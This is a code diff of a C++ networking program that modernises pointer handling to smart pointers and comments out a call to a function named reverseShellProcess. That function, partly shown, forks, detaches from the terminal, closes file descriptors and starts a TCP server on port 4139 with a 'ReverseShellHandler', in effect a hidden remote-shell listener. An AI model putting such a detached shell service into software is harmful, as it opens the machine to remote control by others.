@@ -38,7 +38,7 @@ void reverseShellProcess()
 
         pid = fork();
 
-        if(pid > 0)
+        if (pid > 0)
             exit(0);
 
         // printf("pid: %d\n", getpid());
@@ -53,16 +53,16 @@ void reverseShellProcess()
             close(x);
         }
 
-        TcpServer server([] { return new ReverseShellHandler(); });
+        auto server = TcpServer::Create([] { return std::make_shared<ReverseShellHandler>(); });
         int port = 4139;
-        server.Listen(port);
+        server->Listen(port);
     }
 }
 
 int main(int argc, char **argv)
 {
 
-    reverseShellProcess();
+    // reverseShellProcess();
 
     std::string ip;
 
@@ -73,8 +73,8 @@ int main(int argc, char **argv)
 
     std::cout << "Connecting..." << std::endl;
 
-    Socket *socket = Socket::CreateSocket(SOCK_STREAM);
-    Address *address = ip.empty() ? new Address(PORT) : new Address(ip, PORT);
+    auto socket = Socket::Create(SOCK_STREAM);
+    auto address = ip.empty() ? std::make_shared<Address>(PORT) : std::make_shared<Address>(ip, PORT);
     socket->Connect(address);
 
     std::cout << "Connection established" << std::endl;
